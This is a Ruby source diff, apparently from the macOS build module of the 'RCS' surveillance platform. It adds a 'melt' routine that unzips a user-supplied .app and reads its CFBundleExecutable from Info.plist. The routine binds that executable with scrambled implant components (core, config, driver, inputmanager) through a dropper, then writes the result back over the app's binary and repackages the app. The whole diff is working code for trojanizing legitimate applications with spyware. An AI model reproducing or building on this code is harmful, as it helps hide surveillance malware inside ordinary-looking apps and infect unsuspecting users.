@@ -5,6 +5,8 @@
 # from RCS::Common
 require 'rcs-common/trace'
 
+require 'plist'
+
 module RCS
 module DB
 
@@ -70,6 +72,36 @@ class BuildOSX < Build
   def melt(params)
     trace :debug, "Build: melting: #{params}"
 
+    # TODO: make the default exe an actual default app
+    executable = path('default')
+
+    # the user has provided a file to melt with
+    if params['input']
+      FileUtils.mv File.join(Dir.tmpdir, params['input']), path('input')
+
+      exe = ''
+      # unzip the application and extract the executable file
+      Zip::ZipFile.open(path('input')) do |z|
+        z.each do |f|
+          if f.name['.app/Contents/Info.plist']
+            puts f.name
+            xml = z.file.open(f.name) {|x| x.read}
+            exe = Plist::parse_xml(xml)['CFBundleExecutable']
+            raise "cannot find CFBundleExecutable" if exe.nil?
+            trace :debug, "Build: melting: executable provided into app is [#{exe}]"
+          end
+        end
+        # rescan to search for the exe and extract it
+        z.each do |f|
+          if f.name["MacOS/#{exe}"]
+            z.extract(f, path('exe'))
+            executable = path('exe')
+            @executable_name = f.name
+          end
+        end
+      end
+    end
+
     CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                         path(@scrambled[:config])+' '+
                                         path(@scrambled[:driver])+' '+
@@ -77,7 +109,7 @@ class BuildOSX < Build
                                         path(@scrambled[:inputmanager])+' '+
                                         path(@scrambled[:icon])+' '+
                                         path(@scrambled[:dir])+' '+
-                                        path('default')+' '+
+                                        executable + ' ' +
                                         path('output')
 
     File.exist? path('output') || raise("output file not created by dropper")
@@ -85,10 +117,30 @@ class BuildOSX < Build
     trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
 
     @outputs << 'output'
+
+
+
   end
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
+
+    # substitute the exec into the app
+    if File.exist? path('input')
+      trace :debug, "Build: pack: repacking the app with [#{@executable_name}]"
+
+      Zip::ZipFile.open(path('input')) do |z|
+        z.file.open(@executable_name, 'w') {|f| f.write File.open(path('output'), 'rb') {|f| f.read} }
+      end
+
+      FileUtils.mv(path('input'), path('output.zip'))
+
+      # this is the only file we need to output after this point
+      @outputs = ['output.zip']
+
+      return
+    end
+
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
       z.file.open('install', "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
